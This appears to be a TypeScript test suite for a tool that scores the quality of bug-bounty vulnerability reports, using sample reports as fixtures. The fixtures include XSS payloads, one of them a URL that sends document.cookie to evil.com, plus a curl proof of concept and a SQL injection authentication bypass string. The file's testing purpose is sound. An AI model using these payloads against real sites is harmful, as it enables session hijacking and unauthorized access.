/**
 * Report Quality Scorer Recalibration Tests (RQ6)
 *
 * Validates that the recalibrated scorer:
 * - Penalizes reports without HTTP evidence
 * - Penalizes reports without executable PoC
 * - Penalizes reports without Expected vs Actual
 * - Rewards reports with all H1-standard sections
 * - Minimum quality threshold triggers correctly
 */

import { describe, it, expect } from 'vitest';
import { ReportQualityScorer } from '../core/reporting/report_quality';
import type { H1Report } from '../core/reporting/h1_api';

const scorer = new ReportQualityScorer();

// ─── Test reports ───────────────────────────────────────────────────────────

/** A high-quality report with all H1 sections */
const fullReport: H1Report = {
  title: '[HIGH] Reflected XSS in /search endpoint allows session hijacking',
  severity: 'high',
  suggestedBounty: { min: 500, max: 1500 },
  description: 'A reflected XSS vulnerability was discovered in the search endpoint. The `q` parameter is reflected directly into the HTML response without proper encoding, which allows an attacker to inject arbitrary JavaScript that executes in the victim\'s browser context. This affects all users who click a crafted URL.',
  impact: 'An attacker can steal session cookies, hijack user accounts, and access sensitive personal data. All authenticated users who click the crafted link are affected.',
  steps: [
    'Navigate to https://target.com/search?q=test to confirm the search endpoint reflects input',
    'Replace the search query with the XSS payload: <script>alert(document.cookie)</script>',
    'Observe the JavaScript alert executes, displaying the user\'s session cookie',
    'Craft a URL with the payload to send to a victim: https://target.com/search?q=<script>document.location="https://evil.com/?c="+document.cookie</script>',
  ],
  proof: {},
  cvssScore: 7.1,
  cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
  weaknessId: '79',
  severityJustification: [
    'Attack vector: Network — victim must click a crafted URL',
    'User interaction: Required',
    'Confidentiality impact: High — session cookies accessible',
  ],
  httpEvidence: `**Request:**
\`\`\`http
GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Accept: text/html
\`\`\`

**Response:**
\`\`\`http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html><body>Results for: <script>alert(document.cookie)</script></body></html>
\`\`\``,
  quickReproduction: `**Curl:**
\`\`\`bash
curl 'https://target.com/search?q=<script>alert(document.cookie)</script>'
\`\`\``,
};

/** A bare-minimum report missing all new H1 sections */
const bareReport: H1Report = {
  title: '[MEDIUM] XSS in search',
  severity: 'medium',
  suggestedBounty: { min: 200, max: 500 },
  description: 'XSS found in search. The input is reflected without encoding.',
  impact: 'Users could be affected.',
  steps: [
    'Go to search page',
    'Enter payload',
    'See alert',
  ],
  proof: {},
};

/** A report with some HTTP patterns in text but no structured fields */
const legacyReport: H1Report = {
  title: '[HIGH] SQL Injection in login allows authentication bypass',
  severity: 'high',
  suggestedBounty: { min: 1000, max: 5000 },
  description: 'A SQL injection vulnerability was discovered. Sending POST /api/login with the payload \' OR 1=1-- bypasses authentication. The server returns HTTP/1.1 200 OK with a valid JWT token for the admin account.',
  impact: 'An attacker can bypass authentication and access all user data in the database.',
  steps: [
    'Send POST /api/login with {"email":"\' OR 1=1--","password":"x"}',
    'Observe the server returns HTTP 200 with admin JWT',
    'Use the JWT to access /api/admin endpoints',
  ],
  proof: {},
  cvssScore: 9.8,
  weaknessId: '89',
  severityJustification: ['Critical — full auth bypass'],
};

// ─── Score comparison tests ─────────────────────────────────────────────────

describe('RQ6: Score calibration', () => {
  it('full report scores significantly higher than bare report', () => {
    const fullScore = scorer.scoreReport(fullReport);
    const bareScore = scorer.scoreReport(bareReport);
    expect(fullScore.overall).toBeGreaterThan(bareScore.overall + 20);
  });

  it('report without HTTP evidence scores at least 15% lower', () => {
    const withHttp = scorer.scoreReport(fullReport);
    const withoutHttp = scorer.scoreReport({ ...fullReport, httpEvidence: undefined });
    // 25% weight on httpEvidence category means up to 25 points difference (H16 recalibrated)
    expect(withHttp.overall).toBeGreaterThan(withoutHttp.overall);
    expect(withHttp.categories.httpEvidence).toBeGreaterThan(withoutHttp.categories.httpEvidence);
  });

  it('report without executable PoC scores at least 10% lower', () => {
    const withPoc = scorer.scoreReport(fullReport);
    const withoutPoc = scorer.scoreReport({ ...fullReport, quickReproduction: undefined });
    expect(withPoc.overall).toBeGreaterThan(withoutPoc.overall);
    expect(withPoc.categories.executablePoc).toBeGreaterThan(withoutPoc.categories.executablePoc);
  });

  it('full report meets quality threshold', () => {
    const score = scorer.scoreReport(fullReport);
    expect(score.meetsThreshold).toBe(true);
    expect(score.overall).toBeGreaterThanOrEqual(50);
  });

  it('bare report does not meet quality threshold', () => {
    const score = scorer.scoreReport(bareReport);
    expect(score.meetsThreshold).toBe(false);
    expect(score.overall).toBeLessThan(50);
  });

  it('threshold warning fires for low-quality reports', () => {
    const score = scorer.scoreReport(bareReport);
    const thresholdIssues = score.issues.filter(i =>
      i.message.includes('minimum submission threshold')
    );
    expect(thresholdIssues).toHaveLength(1);
    expect(thresholdIssues[0].severity).toBe('critical');
  });
});

// ─── New category scoring ───────────────────────────────────────────────────

describe('RQ6: HTTP Evidence scoring (15% weight)', () => {
  it('scores high for report with structured httpEvidence code blocks', () => {
    const score = scorer.scoreReport(fullReport);
    // fullReport has 1 pair (2 ```http blocks) = 40 + 30 + 15 = 85
    expect(score.categories.httpEvidence).toBeGreaterThanOrEqual(70);
  });

  it('scores 0 for report with no HTTP evidence at all', () => {
    const score = scorer.scoreReport(bareReport);
    expect(score.categories.httpEvidence).toBe(0);
  });

  it('gives partial credit for HTTP patterns in text (legacy reports)', () => {
    const score = scorer.scoreReport(legacyReport);
    expect(score.categories.httpEvidence).toBeGreaterThan(0);
    expect(score.categories.httpEvidence).toBeLessThan(100);
  });
});

describe('RQ6: Executable PoC scoring (10% weight)', () => {
  it('scores 80+ for report with curl command', () => {
    const score = scorer.scoreReport(fullReport);
    expect(score.categories.executablePoc).toBeGreaterThanOrEqual(80);
  });

  it('scores 0 for report with no executable commands', () => {
    const score = scorer.scoreReport(bareReport);
    expect(score.categories.executablePoc).toBe(0);
  });

  it('gives partial credit for curl in report text (not quickReproduction field)', () => {
    const reportWithCurlInText: H1Report = {
      ...bareReport,
      description: bareReport.description + '\n\nYou can verify with: curl https://target.com/search?q=<script>',
    };
    const score = scorer.scoreReport(reportWithCurlInText);
    expect(score.categories.executablePoc).toBeGreaterThan(0);
    expect(score.categories.executablePoc).toBeLessThan(80);
  });
});

describe('RQ6: Expected vs Actual scoring (5% weight)', () => {
  it('scores 100 for report mentioning expected and actual behavior', () => {
    const reportWithExpectedActual: H1Report = {
      ...fullReport,
      description: fullReport.description + '\n\n**Expected:** Input should be encoded. **Actual:** Input is reflected without encoding.',
    };
    const score = scorer.scoreReport(reportWithExpectedActual);
    expect(score.categories.expectedVsActual).toBe(100);
  });

  it('scores 0 for report without expected/actual language', () => {
    const score = scorer.scoreReport(bareReport);
    expect(score.categories.expectedVsActual).toBe(0);
  });
});

// ─── Non-regression ─────────────────────────────────────────────────────────

describe('RQ6: Non-regression', () => {
  it('H16: reports without structured HTTP evidence score below 60 (not submission-ready)', () => {
    const score = scorer.scoreReport(legacyReport);
    // Legacy reports with text-only HTTP patterns but no structured httpEvidence
    // should NOT meet the submission threshold after H16 recalibration
    expect(score.overall).toBeLessThan(60);
    expect(score.meetsThreshold).toBe(false);
  });

  it('H16: full report with structured HTTP evidence scores above 60 (submission-ready)', () => {
    const score = scorer.scoreReport(fullReport);
    expect(score.overall).toBeGreaterThanOrEqual(60);
    expect(score.meetsThreshold).toBe(true);
  });

  it('grade letters work correctly with new scoring', () => {
    const fullScore = scorer.scoreReport(fullReport);
    expect(['A', 'B']).toContain(fullScore.grade);

    const bareScore = scorer.scoreReport(bareReport);
    expect(['D', 'F']).toContain(bareScore.grade);
  });

  it('meetsThreshold is a boolean on every score result', () => {
    const score = scorer.scoreReport(fullReport);
    expect(typeof score.meetsThreshold).toBe('boolean');
  });

  it('all 8 categories are present in score', () => {
    const score = scorer.scoreReport(fullReport);
    expect(score.categories).toHaveProperty('clarity');
    expect(score.categories).toHaveProperty('completeness');
    expect(score.categories).toHaveProperty('evidence');
    expect(score.categories).toHaveProperty('impact');
    expect(score.categories).toHaveProperty('reproducibility');
    expect(score.categories).toHaveProperty('httpEvidence');
    expect(score.categories).toHaveProperty('executablePoc');
    expect(score.categories).toHaveProperty('expectedVsActual');
  });
});

// ─── C5: Severity inflation penalty ──────────────────────────────────────────

describe('C5: Severity inflation penalty', () => {
  it('penalizes CRITICAL severity without RCE/auth bypass evidence', () => {
    const inflatedReport: H1Report = {
      ...fullReport,
      severity: 'critical',
      title: '[CRITICAL] CORS Misconfiguration on API Endpoint',
      description: 'The server reflects the Origin header allowing cross-origin reads.',
      impact: 'An attacker can read sensitive data from the API.',
    };
    const score = scorer.scoreReport(inflatedReport);
    const issues = score.issues.filter(i => i.message.includes('CRITICAL severity'));
    expect(issues).toHaveLength(1);
    expect(issues[0].severity).toBe('major');
  });

  it('does NOT penalize CRITICAL with RCE evidence', () => {
    const rceReport: H1Report = {
      ...fullReport,
      severity: 'critical',
      title: '[CRITICAL] Remote Code Execution via Deserialization',
      description: 'Unsafe deserialization allows remote code execution on the server.',
      impact: 'An attacker can execute arbitrary code on the application server.',
    };
    const score = scorer.scoreReport(rceReport);
    const issues = score.issues.filter(i => i.message.includes('CRITICAL severity'));
    expect(issues).toHaveLength(0);
  });

  it('does NOT penalize CRITICAL with auth bypass evidence', () => {
    const authBypassReport: H1Report = {
      ...fullReport,
      severity: 'critical',
      title: '[CRITICAL] Authentication Bypass via JWT Algorithm Confusion',
      description: 'JWT algorithm confusion allows authentication bypass to admin.',
      impact: 'Full account takeover of any user including administrators.',
    };
    const score = scorer.scoreReport(authBypassReport);
    const issues = score.issues.filter(i => i.message.includes('CRITICAL severity'));
    expect(issues).toHaveLength(0);
  });

  it('does NOT penalize HIGH severity reports', () => {
    const highReport: H1Report = {
      ...fullReport,
      severity: 'high',
    };
    const score = scorer.scoreReport(highReport);
    const issues = score.issues.filter(i => i.message.includes('CRITICAL severity'));
    expect(issues).toHaveLength(0);
  });

  it('inflated CRITICAL scores lower than legitimate CRITICAL', () => {
    const inflated: H1Report = {
      ...fullReport,
      severity: 'critical',
      title: '[CRITICAL] Header Reflection',
      description: 'Header is reflected in response body.',
      impact: 'Information disclosure.',
    };
    const legitimate: H1Report = {
      ...fullReport,
      severity: 'critical',
      title: '[CRITICAL] RCE via Command Injection',
      description: 'Remote code execution through unsanitized input.',
      impact: 'Full server compromise via arbitrary code execution.',
    };
    const inflatedScore = scorer.scoreReport(inflated);
    const legitimateScore = scorer.scoreReport(legitimate);
    expect(legitimateScore.overall).toBeGreaterThan(inflatedScore.overall);
  });
});
